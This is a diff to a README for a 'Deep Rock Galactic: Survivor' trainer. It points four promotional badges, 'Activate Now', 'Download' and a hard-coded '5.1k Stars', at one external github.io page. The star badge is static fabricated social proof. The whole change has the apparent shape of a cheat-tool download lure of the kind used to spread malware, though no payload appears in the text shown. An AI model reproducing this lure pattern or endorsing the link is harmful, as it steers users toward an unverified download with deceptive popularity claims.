@@ -11,10 +11,10 @@ Survival in **Deep Rock Galactic: Survivor** is all about risk versus reward. Th
 \[!NOTE]
 The trainer runs in memory and does not permanently modify your save data.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-orange?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.1k Stars](https://img.shields.io/badge/⭐️%205.1k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-orange?style=for-the-badge\&logo=rocket)](https://survivor-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://survivor-trainer.github.io/.github/)
+[![⭐️ 5.1k Stars](https://img.shields.io/badge/⭐️%205.1k-Stars-yellow?style=for-the-badge\&logo=github)](https://survivor-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://survivor-trainer.github.io/.github/)
 
 
 ---
